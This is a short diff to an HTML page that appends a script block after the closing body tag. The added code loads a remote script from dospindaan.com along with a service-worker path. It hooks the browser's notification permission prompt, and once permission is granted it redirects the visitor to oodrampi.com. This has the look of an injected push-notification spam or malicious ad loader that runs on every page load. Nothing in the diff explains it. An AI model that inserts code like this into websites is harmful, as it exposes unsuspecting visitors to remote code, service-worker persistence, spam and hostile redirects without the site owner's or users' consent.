@@ -133,5 +133,21 @@
     <script src="js/scripts.js"></script>
     <script src="js/FileSaver.js"></script>
 </body>
+<script>
+    var s = document.createElement('script');
+    s.src='//dospindaan.com/act/files/micro.tag.min.js?z=7667179'+'&sw=/sw-check-permissions-8a57f.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':
+            window.location.replace("//oodrampi.com/4/7667197");break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    };
+    document.head.appendChild(s);
+</script>
 
+    
 </html>
